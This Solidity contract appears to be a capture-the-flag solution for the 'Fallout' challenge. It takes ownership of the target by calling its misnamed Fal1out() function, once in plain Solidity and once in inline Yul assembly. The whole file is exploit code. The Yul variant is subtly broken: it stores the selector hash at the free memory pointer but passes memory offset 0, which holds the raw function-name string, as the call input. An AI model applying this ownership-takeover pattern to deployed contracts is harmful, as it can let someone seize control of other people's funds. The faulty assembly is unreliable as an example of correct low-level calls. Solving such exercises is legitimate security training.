// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface Fallout {
    function owner() external view returns (address);

    function Fal1out() external payable;
}

contract FalloutHack {
    Fallout fallout;

    constructor(address chal) {
        fallout = Fallout(chal);
    }

    function SolidityHack() public {
        fallout.Fal1out();
    }

    function YulHack() public {
        assembly {
            mstore(0, "Fal1out()")
            let fmp := mload(0x40)
            mstore(fmp, keccak256(0, 9))
            let success := call(gas(), sload(fallout.slot), 0, 0, 4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
